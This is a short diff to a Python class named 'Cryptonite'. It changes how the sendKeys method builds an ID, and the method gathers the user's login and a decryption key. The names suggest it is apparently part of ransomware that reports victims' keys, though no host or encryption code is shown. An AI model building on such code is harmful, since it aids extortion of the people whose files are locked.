@@ -52,7 +52,7 @@ class Cryptonite():
 
 
     def sendKeys(self):
-        id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
+        id = uniqKey
         user = os.getlogin()
         key = self.decryptPlease
         try:
